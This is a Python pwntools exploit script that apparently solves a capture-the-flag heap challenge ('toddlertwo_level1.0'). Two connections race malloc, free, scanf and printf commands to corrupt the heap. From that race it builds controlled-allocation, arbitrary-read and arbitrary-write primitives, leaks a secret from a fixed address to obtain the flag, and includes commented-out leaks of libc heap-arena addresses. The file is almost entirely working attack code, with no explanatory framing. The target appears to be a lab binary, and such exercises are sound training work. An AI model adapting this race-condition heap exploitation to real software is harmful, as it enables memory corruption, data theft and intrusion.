from pwn import *
import os
import time

count = 2000
idx = 1

def leak_addr(r1,r2):
    global count
    while True :
        if os.fork() == 0:
            for _ in range(count):
                r1.sendline(b"malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 ")
            os.kill(os.getpid(), 9)
        for _ in range(count):
            r2.sendline(b"printf 0")

        os.wait()
        output =r2.clean()
        r1.clean()
        ### if race not success, go to exception
        try :
            leak = u64(next(i for i in output.split() if b'\x7f' in i and b'AAA' not in i)[8:].ljust(8,b'\x00'))
            break
        except:
            pass
    return leak

def control_alloction(r1,r2,addr):
    global idx
    r1.clean()
    global idx
    r1.clean()
    r2.clean()
    r1.sendline(f"malloc {idx} malloc {idx+1} free {idx+1}".encode())
    while True:
        if os.fork() == 0 :
            r1.sendline(f'free {idx}'.encode())
            os.kill(os.getpid(), 9)
        r2.send((b'scanf %d '%idx + p64(addr) + b'\n')* 2000)
        os.wait()

        time.sleep(0.1)
        r1.sendline(f'malloc {idx} printf {idx}'.encode())
        r1.recvuntil(b'MESSAGE: ')
        write_addr = r1.recvline()[:-1]
        if write_addr == p64(addr).split(b'\x00')[0]:
            break

    r1.sendline(f'malloc {idx+1}'.encode())
    r1.clean()
    idx += 2

def arbitrary_read(r1, r2, addr):
    global idx
    control_alloction(r1,r2,addr)
    r1.sendline(f'printf {idx-1}'.encode())
    r1.recvuntil(b'MESSAGE: ')
    leak = u64(r1.recvline()[:6].ljust(8,b'\x00'))

    return leak

def arbitrary_write(r1, r2, addr, value):
    control_alloction(r1,r2,addr)
    r1.send(b'scanf %d '%(idx-1) + value + b'\n')

def leak_secret(r1,r2,addr):
    global idx
    control_alloction(r1,r2,addr)
    r1.sendline(f'printf {idx-1}'.encode())
    r1.recvuntil(b'MESSAGE: ')
    leak = u64(r1.recvline()[:8].ljust(8,b'\x00'))
    return leak

p = process('/challenge/toddlertwo_level1.0')


r1 = remote("0.0.0.0",1337)
r2 = remote("0.0.0.0",1337)

secret_addr = 0x40568e

b = int.to_bytes(leak_secret(r1,r2,secret_addr+8),8,'little')
a = int.to_bytes(leak_secret(r1,r2,secret_addr),8,'little')
print(a)
print(b)
r1.sendline(b'send_flag')
r1.sendline(a+b)
r1.interactive()
# pthread_leak = leak_addr(r1,r2)
# print(f'PTHREAD : {hex(pthread_leak)}')
# main_arena_ptr = pthread_leak - 0x8d0 + 0x890
# main_arena_addr = arbitrary_read(r1,r2,main_arena_ptr)
# print(f'Main_ARENA : {hex(main_arena_addr)}')
# arbitrary_write(r1,r2,main_arena_ptr,b'AAAAASSSSSS')
# print(hex(arbitrary_read(r1,r2,main_arena_ptr)))


p.kill()